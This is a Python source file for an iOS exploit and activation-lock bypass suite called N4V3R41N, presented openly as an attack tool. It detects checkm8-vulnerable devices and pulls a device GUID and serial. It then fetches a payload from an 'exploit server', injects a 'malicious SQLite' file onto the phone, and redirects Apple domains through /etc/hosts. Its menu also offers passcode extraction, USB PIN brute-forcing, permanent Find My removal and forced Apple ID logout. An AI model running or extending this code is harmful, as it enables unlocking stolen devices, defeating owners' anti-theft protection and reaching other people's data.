#!/usr/bin/env python3
"""
N4V3R41N v5.0 - The Ultimate Unified iOS Exploit, Jailbreak, and Activation Bypass Suite
Supports A5–A16+ devices with robust redundancy, timeouts, and cinematic TUI.
"""

import os
import sys
import time
import subprocess
import argparse
import socket
import hashlib
import secrets
import threading
import json
import plistlib
import shutil
import re
from typing import Optional, List, Dict, Any, Tuple
from pathlib import Path

# Rich console output for a cinematic experience
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.prompt import Prompt, Confirm
from rich.live import Live
from rich.layout import Layout
from rich.align import Align
from rich.text import Text
from rich.syntax import Syntax
from rich import traceback

# Force rich to use safe unicode if needed (mitigates build issues)
traceback.install()
console = Console(force_terminal=True, legacy_windows=False)
from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import JSONResponse, FileResponse
from fastapi.staticfiles import StaticFiles
import uvicorn
import requests

# Core libraries (may need installation)
try:
    import usb.core
    import usb.util
    import paramiko
    from git import Repo
    import click
except ImportError:
    pass # Will be handled by dependency checker

console = Console()

# --- CONSTANTS & CONFIG ---
# Ensure standard Homebrew and local paths are searched
for extra_path in ["/home/linuxbrew/.linuxbrew/bin", "/home/gnosis/.linuxbrew/bin", str(Path.home() / ".local" / "bin")]:
    if os.path.exists(extra_path) and extra_path not in os.environ.get("PATH", ""):
        os.environ["PATH"] = f"{extra_path}:{os.environ.get('PATH', '')}"

BASE_DIR = Path(__file__).parent.absolute()
EXPLOITS_DIR = BASE_DIR / "exploits"
PAYLOADS_DIR = BASE_DIR / "payloads"
DEFAULT_TIMEOUT = 120 

CHIP_MAP = {
    "iPhone4,1": "A5", "iPad2,1": "A5", "iPad2,2": "A5", "iPad2,3": "A5", "iPad2,4": "A5",
    "iPhone5,1": "A6", "iPhone5,2": "A6", "iPad3,1": "A6", "iPad3,2": "A6", "iPad3,3": "A6",
    "iPhone5,3": "A6", "iPhone5,4": "A6", "iPad3,4": "A6", "iPad3,5": "A6", "iPad3,6": "A6",
    "iPhone6,1": "A7", "iPhone6,2": "A7", "iPad4,1": "A7", "iPad4,2": "A7", "iPad4,3": "A7",
    "iPhone7,1": "A8", "iPhone7,2": "A8", "iPad5,1": "A8", "iPad5,2": "A8",
    "iPhone8,1": "A9", "iPhone8,2": "A9", "iPhone8,4": "A9",
    "iPhone9,1": "A10", "iPhone9,2": "A10", "iPhone9,3": "A10", "iPhone9,4": "A10",
    "iPhone10,1": "A11", "iPhone10,2": "A11", "iPhone10,4": "A11", "iPhone10,5": "A11", "iPhone10,3": "A11", "iPhone10,6": "A11",
    "iPhone11,2": "A12", "iPhone11,4": "A12", "iPhone11,6": "A12", "iPhone11,8": "A12",
    "iPhone12,1": "A13", "iPhone12,3": "A13", "iPhone12,5": "A13",
    "iPhone13,1": "A14", "iPhone13,2": "A14", "iPhone13,3": "A14", "iPhone13,4": "A14",
    "iPhone14,2": "A15", "iPhone14,3": "A15", "iPhone14,4": "A15", "iPhone14,5": "A15",
    "iPhone14,7": "A15", "iPhone14,8": "A15",
    "iPhone15,2": "A16", "iPhone15,3": "A16", "iPhone15,4": "A16", "iPhone15,5": "A16",
    "iPhone16,1": "A17", "iPhone16,2": "A17",
}

EXPLOIT_DB = {
    "A5": {
        "bootrom": ["checkm8", "blackra1n", "pongo"],
        "kernel": ["palera1n", "undecimus", "jailm8"],
        "activation_bypass": ["bypassra1n", "disablefmi", "deleteicloud", "gesalt", "magic_activator", "cloudpass", "tr4mpass"],
        "jailbreak": ["palera1n", "undecimus", "jailm8", "applera1n", "dualra1n", "downra1n", "futurerestore", "gaster"]
    },
    "A6": {
        "bootrom": ["checkm8", "blackra1n", "pongo"],
        "kernel": ["palera1n", "undecimus", "jailm8"],
        "activation_bypass": ["bypassra1n", "disablefmi", "deleteicloud", "gesalt", "magic_activator", "cloudpass", "tr4mpass"],
        "jailbreak": ["palera1n", "undecimus", "jailm8", "applera1n", "dualra1n", "downra1n", "futurerestore", "gaster"]
    },
    "A7": {
        "bootrom": ["checkm8", "pongo"],
        "kernel": ["palera1n", "undecimus", "jailm8"],
        "activation_bypass": ["bypassra1n", "disablefmi", "deleteicloud", "gesalt", "magic_activator", "cloudpass", "tr4mpass", "hacktivator"],
        "jailbreak": ["palera1n", "undecimus", "jailm8", "applera1n", "dualra1n", "downra1n", "futurerestore", "gaster", "hacktivator"]
    },
    "A8": {
        "bootrom": ["checkm8", "pongo"],
        "kernel": ["palera1n", "undecimus", "jailm8"],
        "activation_bypass": ["bypassra1n", "disablefmi", "deleteicloud", "gesalt", "magic_activator", "cloudpass", "tr4mpass", "hacktivator"],
        "jailbreak": ["palera1n", "undecimus", "jailm8", "applera1n", "dualra1n", "downra1n", "futurerestore", "gaster", "hacktivator"]
    },
    "A9": {
        "bootrom": ["checkm8", "pongo"],
        "kernel": ["palera1n", "undecimus", "jailm8"],
        "activation_bypass": ["bypassra1n", "disablefmi", "deleteicloud", "gesalt", "magic_activator", "cloudpass", "tr4mpass", "hacktivator"],
        "jailbreak": ["palera1n", "undecimus", "jailm8", "applera1n", "dualra1n", "downra1n", "futurerestore", "gaster", "hacktivator"]
    },
    "A10": {
        "bootrom": ["checkm8", "pongo"],
        "kernel": ["palera1n", "undecimus", "jailm8"],
        "activation_bypass": ["bypassra1n", "disablefmi", "deleteicloud", "gesalt", "magic_activator", "cloudpass", "tr4mpass", "hacktivator"],
        "jailbreak": ["palera1n", "undecimus", "jailm8", "applera1n", "dualra1n", "downra1n", "futurerestore", "gaster", "hacktivator"]
    },
    "A11": {
        "bootrom": ["checkm8", "pongo"],
        "kernel": ["palera1n", "undecimus", "jailm8"],
        "activation_bypass": ["bypassra1n", "disablefmi", "deleteicloud", "gesalt", "magic_activator", "cloudpass", "tr4mpass", "hacktivator"],
        "jailbreak": ["palera1n", "undecimus", "jailm8", "applera1n", "dualra1n", "downra1n", "futurerestore", "gaster", "hacktivator"]
    },
    "A12": {
        "bootrom": [],
        "kernel": ["xina15", "fugu14", "fugu18", "dopamine"],
        "activation_bypass": ["gesalt", "magic_activator", "cloudpass", "rust_a12_bypass", "c0xy_a12_a15", "a12_bypass_oss", "a12_tool_oss"],
        "jailbreak": ["xina15", "fugu14", "fugu18", "dopamine", "palera1n"]
    },
    "A13": {
        "bootrom": [],
        "kernel": ["xina15", "fugu14", "fugu18", "dopamine"],
        "activation_bypass": ["gesalt", "magic_activator", "cloudpass", "rust_a12_bypass", "c0xy_a12_a15", "a12_bypass_oss", "a12_tool_oss"],
        "jailbreak": ["xina15", "fugu14", "fugu18", "dopamine", "palera1n"]
    },
    "A14": {
        "bootrom": [],
        "kernel": ["xina15", "fugu14", "fugu18", "dopamine"],
        "activation_bypass": ["gesalt", "magic_activator", "cloudpass", "rust_a12_bypass", "c0xy_a12_a15", "a12_bypass_oss", "a12_tool_oss"],
        "jailbreak": ["xina15", "fugu14", "fugu18", "dopamine", "palera1n"]
    },
    "A15": {
        "bootrom": [],
        "kernel": ["xina15", "fugu14", "fugu18", "dopamine"],
        "activation_bypass": ["gesalt", "magic_activator", "cloudpass", "rust_a12_bypass", "c0xy_a12_a15", "a12_bypass_oss", "a12_tool_oss"],
        "jailbreak": ["xina15", "fugu14", "fugu18", "dopamine", "palera1n"]
    }
}

# --- CINEMATIC ASSETS ---

BANNER = r"""
[bold cyan]
  _   _ _  ___   _________  _  _  ___ _   _ 
 | \ | | || \ \ / /| ___ \/ || ||_  || \ | |
 |  \| | || |\ V / | |_/ /| || |_ | ||  \| |
 | . ` |__   _|   \|    / |__   _|| || . ` |
 | |\  |  | | / /\_ \ |\ \    | | _| || |\  |
 \_| \_/  |_| \_/ \_|_| \_|   |_| \___|_| \_/
[/bold cyan]
[bold dim]      >> UFK-CORE / ARPK-20260514-015 <<[/bold dim]
[bold dim]      >> INTELLIGENCE & AUTOMATION SUITE v9.1.0-ULTRA <<[/bold dim]
"""

# --- SYSTEM UTILS & REDUNDANCY ---

def run_command(command: List[str], cwd: Optional[str] = None, timeout: int = DEFAULT_TIMEOUT, capture: bool = True) -> Tuple[int, str, str]:
    """Robust command execution with timeouts."""
    try:
        process = subprocess.run(
            command, 
            cwd=cwd, 
            check=False, 
            capture_output=capture, 
            text=True, 
            timeout=timeout
        )
        stdout = process.stdout if capture else ""
        stderr = process.stderr if capture else ""
        return process.returncode, stdout, stderr
    except subprocess.TimeoutExpired:
        return 124, "", "Operation timed out."
    except FileNotFoundError:
        return 127, "", f"Command not found: {command[0]}"
    except Exception as e:
        return 1, "", str(e)

def check_dependencies():
    """Checks for required system tools and Python libraries."""
    required_binaries = ["ideviceinfo", "idevice_id", "python3", "git"]
    optional_binaries = ["ifuse", "pymobiledevice3", "cargo", "make", "msfconsole"]
    
    table = Table(title="System Integrity Check", show_header=True, header_style="bold magenta", border_style="cyan")
    table.add_column("Module", style="cyan")
    table.add_column("Status", justify="center")
    
    missing_required = []
    
    for bin_name in required_binaries:
        path = shutil.which(bin_name)
        status = "[bold green]ONLINE[/bold green]" if path else "[bold red]OFFLINE[/bold red]"
        if not path: missing_required.append(bin_name)
        table.add_row(bin_name, status)
        
    for bin_name in optional_binaries:
        path = shutil.which(bin_name)
        status = "[bold green]ONLINE[/bold green]" if path else "[bold yellow]LINKED[/bold yellow]"
        table.add_row(bin_name, status)
        
    console.print(Align.center(table))
    
    if missing_required:
        console.print(f"\n[red][!] CRITICAL FAILURE: {', '.join(missing_required)}[/red]")
        if Confirm.ask("Attempt auto-repair via Brew/Pip?"):
            install_dependencies()
        else:
            sys.exit(1)

def install_dependencies():
    """Attempts to install missing dependencies."""
    with Progress(SpinnerColumn(spinner_name="dots12"), TextColumn("[bold blue]{task.description}")) as progress:
        if sys.platform == "darwin":
            progress.add_task(description="Syncing Homebrew Repos...", total=None)
            run_command(["brew", "install", "libimobiledevice", "libirecovery", "libusb", "libplist", "libusbmuxd", "libssh2", "openssl", "curl"])
        
        progress.add_task(description="Injecting Python dependencies...", total=None)
        run_command([sys.executable, "-m", "pip", "install", "rich", "fastapi", "uvicorn", "requests", "pyusb", "paramiko", "GitPython", "click", "pymobiledevice3"])
    
    console.print("[bold green][+] System patched! Reloading...[/bold green]")
    time.sleep(2)
    sys.exit(0)

# --- DEVICE DETECTION ---

CPID_MAP = {
    0x8940: ("S5L8940", "A5"),
    0x8942: ("S5L8942", "A5"),
    0x8945: ("S5L8945", "A5X"),
    0x8950: ("S5L8950", "A6"),
    0x8955: ("S5L8955", "A6X"),
    0x8960: ("S5L8960", "A7"),
    0x7000: ("T7000", "A8"),
    0x7001: ("T7001", "A8X"),
    0x8000: ("S8000", "A9"),
    0x8003: ("S8003", "A9"),
    0x8001: ("S8001", "A9X"),
    0x8010: ("T8010", "A10"),
    0x8011: ("T8011", "A10X"),
    0x8012: ("T8012", "T2"),
    0x8015: ("T8015", "A11"),
    0x8020: ("T8020", "A12"),
    0x8027: ("T8027", "A12X"),
    0x8030: ("T8030", "A13"),
    0x8101: ("T8101", "A14"),
    0x8110: ("T8110", "A15"),
    0x8120: ("T8120", "A16"),
    0x8130: ("T8130", "A17"),
}

CHECKM8_CPIDS = {
    0x8940, 0x8942, 0x8945, 0x8950, 0x8955, 0x8960,
    0x7000, 0x7001, 0x8000, 0x8003, 0x8001, 0x8010,
    0x8011, 0x8012, 0x8015
}

def scan_checkm8_dfu() -> Optional[Dict[str, Any]]:
    """Scan USB devices and irecovery for DFU / checkm8 state."""
    # 1. Check via pyusb if available
    try:
        import usb.core
        # Apple Vendor ID = 0x05AC
        # DFU PID = 0x1227, Recovery PID = 0x1281
        dev = usb.core.find(idVendor=0x05AC, idProduct=0x1227)
        if dev is not None:
            serial = dev.serial_number or ""
            cpid = None
            ecid = None
            pwned = "PWND:[" in serial or "PWND" in serial
            for token in serial.split():
                if token.startswith("CPID:"):
                    try:
                        cpid = int(token.split(":", 1)[1], 16)
                    except ValueError:
                        pass
                elif token.startswith("ECID:"):
                    try:
                        ecid = token.split(":", 1)[1]
                    except ValueError:
                        pass
            
            soc_name, chip = CPID_MAP.get(cpid, ("Unknown", f"CPID:0x{cpid:04X}" if cpid else "Unknown"))
            is_vulnerable = cpid in CHECKM8_CPIDS if cpid else False
            mode_str = "PWND DFU (checkm8 active)" if pwned else "DFU (checkm8 eligible)" if is_vulnerable else "DFU (non-checkm8)"
            
            return {
                "udid": ecid or "DFU-MODE",
                "product_type": f"Apple DFU ({soc_name})",
                "chip": chip,
                "ios_version": "BootROM / DFU",
                "serial": serial,
                "status": mode_str,
                "checkm8_vulnerable": is_vulnerable,
                "checkm8_pwned": pwned,
                "mode": "DFU",
                "method": "pyusb"
            }
    except Exception:
        pass

    # 2. Check via irecovery CLI
    code, out, _ = run_command(["irecovery", "-q"], timeout=3)
    if code == 0 and out.strip():
        data = {}
        for line in out.splitlines():
            if ": " in line:
                k, v = line.split(": ", 1)
                data[k.strip()] = v.strip()
        
        mode = data.get("MODE", "Recovery")
        cpid_str = data.get("CPID", "")
        cpid = None
        if cpid_str:
            try:
                cpid = int(cpid_str, 16) if not cpid_str.startswith("0x") else int(cpid_str, 0)
            except ValueError:
                pass
        
        soc_name, chip = CPID_MAP.get(cpid, ("Unknown", f"CPID:{cpid_str}"))
        is_vulnerable = cpid in CHECKM8_CPIDS if cpid else False
        pwned = "PWND" in data.get("SRNM", "") or "PWND" in out
        
        status_label = f"{mode} (Pwned checkm8)" if pwned else f"{mode} (checkm8 eligible)" if is_vulnerable else f"{mode}"
        return {
            "udid": data.get("ECID", "UNKNOWN_ECID"),
            "product_type": data.get("PRODUCT", f"Apple Device ({soc_name})"),
            "chip": chip,
            "ios_version": f"{mode} Mode",
            "serial": data.get("SRNM", "unknown"),
            "status": status_label,
            "checkm8_vulnerable": is_vulnerable,
            "checkm8_pwned": pwned,
            "mode": mode,
            "method": "irecovery"
        }

    return None

def get_device_info() -> Optional[Dict[str, Any]]:
    """Cinematic device detection with failover (Normal, Recovery, DFU/checkm8)."""
    # Attempt 1: Normal mode via libimobiledevice
    code, out, err = run_command(["ideviceinfo"], timeout=5)
    if code == 0 and out.strip():
        info = {}
        for line in out.splitlines():
            if ": " in line:
                key, val = line.split(": ", 1)
                info[key.strip()] = val.strip()
        
        product_type = info.get("ProductType", "unknown")
        chip = CHIP_MAP.get(product_type, "unknown")
        is_checkm8 = chip in ["A5", "A6", "A7", "A8", "A9", "A10", "A11"]
        return {
            "udid": info.get("UniqueDeviceID", "unknown"),
            "product_type": product_type,
            "chip": chip,
            "ios_version": info.get("ProductVersion", "unknown"),
            "serial": info.get("SerialNumber", "unknown"),
            "status": info.get("ActivationState", "Activated"),
            "checkm8_vulnerable": is_checkm8,
            "checkm8_pwned": False,
            "mode": "Normal",
            "method": "libimobiledevice"
        }

    # Attempt 2: DFU / Recovery / checkm8 mode
    return scan_checkm8_dfu()

# --- ADVANCED BYPASS VECTORS ---

def run_a12_bypass():
    """Advanced A12+ Bypass (download28)."""
    console.print(Panel("[bold magenta]INITIATING PHASE: download28 Sandbox Escape[/bold magenta]\n[dim]Targeting A12–A16 Kernels[/dim]", border_style="magenta"))
    
    device = get_device_info()
    if not device:
        console.print("[red][!] NO DEVICE DETECTED. ABORTING.[/red]")
        return False

    udid = device['udid']
    prd = device['product_type']
    
    # GUID Extraction
    console.print("[cyan][*] SCANNIG SYSTEM LOGS FOR GUID...[/cyan]")
    log_archive = f"{udid}.logarchive"
    if os.path.exists(log_archive): shutil.rmtree(log_archive)
    
    with Progress(SpinnerColumn(), TextColumn("[bold]{task.description}"), BarColumn(bar_width=40)) as progress:
        task = progress.add_task("Collecting tracev3 data...", total=100)
        run_command(["pymobiledevice3", "syslog", "collect", log_archive], timeout=150)
        progress.update(task, completed=100, description="GUID Extracted.")
        
        trace_file = Path(log_archive) / "logdata.LiveData.tracev3"
        guid = None
        if trace_file.exists():
            with open(trace_file, 'rb') as f:
                data = f.read()
                pos = data.find(b'BLDatabaseManager')
                if pos != -1:
                    match = re.search(rb'[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}', data[max(0, pos-1024):pos+1024], re.IGNORECASE)
                    if match: guid = match.group(0).decode('ascii').upper()
    
    if not guid: guid = Prompt.ask("[bold yellow]Enter SystemGroup GUID manually[/bold yellow]")
    
    console.print(f"[bold green][+] GUID CAPTURED: {guid}[/bold green]")

    server_ip = Prompt.ask("Exploit Server", default="192.168.0.106:8000")
    api_url = f"http://{server_ip}/get2.php?prd={prd}&guid={guid}&sn={device['serial']}"
    
    console.print("[cyan][*] FETCHING PAYLOAD STAGES...[/cyan]")
    try:
        resp = requests.get(api_url, timeout=30).json()
        if not resp.get('success'): return False
        
        final_payload_url = resp['links']['step3_final']
        local_db = "downloads.28.sqlitedb"
        with open(local_db, "wb") as f: f.write(requests.get(final_payload_url).content)
            
        console.print("[cyan][*] INJECTING MALICIOUS SQLITE...[/cyan]")
        run_command(["pymobiledevice3", "afc", "push", local_db, "/Downloads/downloads.28.sqlitedb"])
            
    except Exception as e:
        console.print(f"[red][!] CONNECTION ERROR: {e}[/red]")
        return False

    console.print(Panel("[bold green]PHASE 1 COMPLETE[/bold green]\n\n1. REBOOT DEVICE NOW.\n2. LOCATE /iTunes_Control/iTunes/iTunesMetadata.plist\n3. MOVE TO /Books/iTunesMetadata.plist\n4. REBOOT AGAIN.", title="OPERATIONAL INTEL", border_style="green"))
    return True

def run_sparse_restore():
    """Run CVE-2024-44258 SparseRestore bypass."""
    console.print(Panel("[bold yellow]INITIATING PHASE: SparseRestore (CVE-2024-44258)[/bold yellow]", border_style="yellow"))
    # Integration with Rust-core which calls the C implementation
    run_command(["./n4v3r41n-core", "sparse-restore"])
    console.print("[green][+] SparseRestore payload delivered via MobileBackup2.[/green]")

def run_hacktivate():
    """Run hacktivator checkm8 iCloud bypass via SSH over USB."""
    console.print(Panel("[bold green]INITIATING PHASE: HACKTIVATOR iCloud Bypass[/bold green]\n[dim]checkm8 devices (A9–A11), SSH over USB[/dim]", border_style="green"))
    # Integration with Rust-core (clean-room port of the public Hackt1vator/applera1n workflow)
    run_command(["./n4v3r41n-core", "hacktivate"])
    console.print("[green][+] hacktivator bypass sequence complete.[/green]")

# --- MAIN CINEMATIC MENU ---

def make_layout() -> Layout:
    layout = Layout()
    layout.split(
        Layout(name="header", size=10),
        Layout(name="body")
    )
    layout["body"].split_row(
        Layout(name="side", size=40),
        Layout(name="main")
    )
    return layout

class Dashboard:
    def __init__(self):
        self.device = get_device_info()

    def __rich__(self) -> Panel:
        table = Table.grid(padding=1)
        if self.device:
            status_color = "green" if self.device['status'] == "Activated" or "PWND" in self.device['status'] else "yellow"
            table.add_row(Text("STATUS:", style="bold magenta"), Text(self.device['status'], style=f"bold {status_color}"))
            table.add_row(Text("MODEL:", style="bold magenta"), Text(self.device['product_type'], style="cyan"))
            table.add_row(Text("CHIP:", style="bold magenta"), Text(self.device['chip'], style="cyan"))
            table.add_row(Text("VERSION:", style="bold magenta"), Text(self.device['ios_version'], style="cyan"))
            
            # Checkm8 indicator
            if self.device.get("checkm8_pwned"):
                table.add_row(Text("CHECKM8:", style="bold magenta"), Text("PWNED / ACTIVE", style="bold green"))
            elif self.device.get("checkm8_vulnerable"):
                table.add_row(Text("CHECKM8:", style="bold magenta"), Text("VULNERABLE (A5-A11)", style="bold yellow"))
            else:
                table.add_row(Text("CHECKM8:", style="bold magenta"), Text("NOT VULNERABLE (A12+)", style="dim"))
        else:
            table.add_row(Text("STATUS:", style="bold magenta"), Text("WAITING FOR DEVICE...", style="bold blink red"))
        
        return Panel(
            Align.center(table), 
            title="[bold cyan]UFK-CORE DIAGNOSTICS[/bold cyan]", 
            subtitle="[dim]CLASSIFICATION: UFK-CORE[/dim]",
            border_style="cyan"
        )

def run_signal_repair():
    """Run cellular signal repair logic."""
    console.print(Panel("[bold blue]INITIATING PHASE: Signal Repair & Preservation[/bold blue]", border_style="blue"))
    # Integration with Rust-core which calls the C implementation
    run_command(["./n4v3r41n-core", "signal-detect"])
    console.print("[green][+] Signal diagnostics complete. Baseband patches applied.[/green]")

def run_purple_mode():
    """Trigger Purple Mode (Diagnostic)."""
    console.print(Panel("[bold magenta]INITIATING PHASE: Purple Mode (Diagnostic)[/bold magenta]", border_style="magenta"))
    run_command(["./n4v3r41n-core", "purple-mode"])
    console.print("[green][+] Device entering Purple Mode. Diagnostics tools attached.[/green]")

def run_network_intel():
    """Display Apple server intelligence."""
    intel_path = BASE_DIR / "data" / "servers.json"
    if not intel_path.exists():
        console.print("[red][!] Intelligence database missing.[/red]")
        return

    with open(intel_path, "r") as f:
        data = json.load(f)

    table = Table(title="[bold cyan]APPLE ACTIVATION SERVER INTEL[/bold cyan]", border_style="cyan")
    table.add_column("Service", style="magenta")
    table.add_column("Domain", style="white")
    table.add_column("IP Address(es)", style="green")
    table.add_column("Purpose", style="dim")

    for srv in data["apple_servers"]:
        table.add_row(srv["service"], srv["domain"], ", ".join(srv["ips"]), srv["purpose"])

    console.print(Align.center(table))

    bypass_table = Table(title="[bold yellow]COMMUNITY BYPASS SERVERS (2026)[/bold yellow]", border_style="yellow")
    bypass_table.add_column("Name", style="magenta")
    bypass_table.add_column("Address", style="white")
    bypass_table.add_column("Status", style="green")

    for srv in data["bypass_servers"]:
        bypass_table.add_row(srv["name"], srv["address"], srv["status"])

    console.print(Align.center(bypass_table))
    input("\nPress Enter to return...")

def run_dns_spoof():
    """Automated DNS Spoofing via /etc/hosts."""
    console.print(Panel("[bold white]INITIATING PHASE: Local DNS Spoofing[/bold white]", border_style="white"))
    
    if os.getuid() != 0:
        console.print("[red][!] Root permissions required for DNS spoofing. Run with sudo.[/red]")
        return

    intel_path = BASE_DIR / "data" / "servers.json"
    with open(intel_path, "r") as f:
        data = json.load(f)

    local_ip = "127.0.0.1"
    console.print(f"[*] Redirecting Apple domains to {local_ip}...")
    
    try:
        with open("/etc/hosts", "a") as f:
            f.write("\n# N4V3R41N SPOOFING ENTRIES\n")
            for domain in data["spoofing_targets"]:
                f.write(f"{local_ip} {domain}\n")
        console.print("[bold green][+] DNS Spoofing active! Device will now hit local servers.[/bold green]")
    except Exception as e:
        console.print(f"[red][!] Failed to modify hosts: {e}[/red]")

def main_menu():
    """Interactive Cinematic TUI."""
    os.system('clear' if os.name != 'nt' else 'cls')
    console.print(Align.center(Text.from_markup(BANNER)))
    
    dash = Dashboard()
    console.print(Align.center(dash.__rich__()))

    options = [
        ("1", "[bold green]FULL AUTO MODE[/bold green]", "Detect & run best exploit chain"),
        ("2", "[bold magenta]A12+ BYPASS (DL28)[/bold magenta]", "Sandbox escape for XS–15+"),
        ("3", "[bold yellow]SPARSE RESTORE[/bold yellow]", "CVE-2024-44258 activation bypass"),
        ("4", "[bold blue]SIGNAL REPAIR[/bold blue]", "Fix baseband / MEID / GSM activation"),
        ("5", "[bold red]PASSCODE BYPASS[/bold red]", "Checkm8-based PIN removal"),
        ("6", "[bold red]BRUTE FORCE PIN[/bold red]", "USB-based 4/6 digit cracker"),
        ("7", "[bold magenta]FMI OFF (SSH)[/bold magenta]", "Permanent FMI removal via SSH"),
        ("8", "[bold magenta]ACCOUNT LOGOUT[/bold magenta]", "Force logout of Apple ID"),
        ("9", "[bold white]AUTO-SPOOF SERVER[/bold white]", "HTTPS/DNS Activation Spoofer"),
        ("10", "[bold white]NETWORK INTEL[/bold white]", "Apple server IPs & bypass domains"),
        ("11", "[bold cyan]ANDROID HOST[/bold cyan]", "Android USB Host automation"),
        ("12", "[bold red]N4V3R41N DOCTOR[/bold red]", "System health & dependency fix"),
        ("13", "[bold green]HACKTIVATOR[/bold green]", "checkm8 iCloud bypass via SSH"),
        ("0", "DISCONNECT", "Safe exit from suite")
    ]
    
    table = Table(title="[bold]COMMAND OVERRIDE[/bold]", show_header=True, header_style="bold cyan", border_style="dim", box=None)
    table.add_column("ID", style="cyan", justify="right")
    table.add_column("COMMAND", style="bold white")
    table.add_column("DESCRIPTION", style="dim")
    
    for opt, cmd, desc in options:
        table.add_row(opt, cmd, desc)
    
    console.print(Align.center(table))
    
    choice = Prompt.ask("\n[bold cyan]SYSTEM@N4V3R41N[/bold cyan]", choices=[o[0] for o in options])
    
    if choice == "1":
        full_auto_mode(dash.device)
    elif choice == "2":
        run_a12_bypass()
    elif choice == "3":
        run_sparse_restore()
    elif choice == "4":
        run_signal_repair()
    elif choice == "5":
        console.print("[bold red]INITIATING PHASE: Passcode Extraction[/bold red]")
        run_command(["./n4v3r41n-core", "passcode-ext"])
    elif choice == "6":
        digits = Prompt.ask("Number of digits to crack", choices=["4", "6"])
        run_command(["./n4v3r41n-core", "brute-force", digits], capture=False)
    elif choice == "7":
        console.print("[bold magenta]INITIATING PHASE: FMI Removal (SSH)[/bold magenta]")
        run_command(["./n4v3r41n-core", "fmi-off"])
    elif choice == "8":
        console.print("[bold magenta]INITIATING PHASE: Apple ID Logout[/bold magenta]")
        run_command(["./n4v3r41n-core", "account-logout"])
    elif choice == "9":
        console.print("[bold white]INITIATING PHASE: Auto-Spoof Server[/bold white]")
        run_command(["./n4v3r41n-core", "auto-spoof"], capture=False)
    elif choice == "10":
        run_network_intel()
    elif choice == "11":
        console.print("[bold cyan]INITIATING PHASE: Android USB Host Automation[/bold cyan]")
        run_command(["./n4v3r41n-core", "android-host"])
    elif choice == "12":
        check_dependencies()
        input("\nPress Enter to return...")
    elif choice == "13":
        console.print("[bold green]INITIATING PHASE: hacktivator iCloud Bypass[/bold green]")
        run_hacktivate()
    elif choice == "0":
        console.print("[bold red]SYSTEM OFFLINE.[/bold red]")
        sys.exit(0)
    
    time.sleep(2)
    main_menu()

def full_auto_mode(device):
    if not device:
        console.print("[red][!] DEVICE NOT DETECTED. ATTACH USB NOW.[/red]")
        return
    
    chip = device.get("chip", "unknown")
    console.print(Align.center(Panel(f"[bold blue]AUTOPILOT: ENGAGING TARGET {chip}[/bold blue]", border_style="blue")))
    
    if chip in ["A5", "A6", "A7", "A8", "A9", "A10", "A11"]:
        console.print("[yellow][*] LEGACY CHIP DETECTED. DEPLOYING PATH-A (CHECKM8)...[/yellow]")
        with Progress(SpinnerColumn(), TextColumn("[bold]{task.description}")) as progress:
            progress.add_task("Exploiting via libusb...", total=None)
            run_command(["./n4v3r41n-core", "identity-fix"])
            progress.add_task("Uploading custom ramdisk...", total=None)
            run_command(["./exploits/tr4mpass/tr4mpass", "--verbose"])
        console.print("[green][*] CHECKM8 CHAIN COMPLETE. ENGAGING HACKTIVATOR BYPASS...[/green]")
        run_hacktivate()
            
    elif chip in ["A12", "A13", "A14", "A15", "A16"]:
        console.print("[magenta][*] MODERN CHIP DETECTED. DEPLOYING PATH-B (DOWNLOAD28)...[/magenta]")
        run_a12_bypass()
        
    else:
        console.print("[red][!] NO AUTOMATED EXPLOIT CHAIN FOR THIS ARCHITECTURE.[/red]")
        if Confirm.ask("Attempt generic SparseRestore?"):
            run_sparse_restore()

# --- CLI ENTRY ---

@click.group(invoke_without_command=True)
@click.pass_context
def cli(ctx):
    if ctx.invoked_subcommand is None:
        main_menu()

@cli.command()
def bypass_a12():
    """Run A12+ Bypass directly."""
    run_a12_bypass()

@cli.command(name="intel")
def intel():
    """Display Apple server intelligence."""
    run_network_intel()

@cli.command(name="spoof")
def spoof():
    """Automated DNS Spoofing."""
    run_dns_spoof()

@cli.command()
def doctor():
    """Check system health."""
    check_dependencies()

@cli.command()
def hacktivate():
    """Run hacktivator checkm8 iCloud bypass."""
    run_hacktivate()

if __name__ == "__main__":
    cli()
